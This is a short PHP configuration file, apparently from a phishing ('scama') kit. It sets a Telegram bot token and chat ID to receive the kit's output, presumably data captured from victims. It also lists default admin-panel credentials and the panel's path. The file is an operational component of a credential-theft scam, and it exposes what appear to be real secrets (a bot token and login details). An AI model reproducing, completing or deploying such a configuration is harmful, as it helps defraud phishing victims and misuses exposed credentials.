<?php
// setting scama

$botToken="5287783353:AAHUPeYMNz62Md7jPoXWovazGcqV-YY7VC8"; // token bot telegram
$chatId="1947824557";  // chatId telegram
//Default Username for admin panel: zae3m
//Default Password for admin panel: @zae3m_tut
//You can Change them after you login to panel
//To visit panel: scama link/Happy
?>
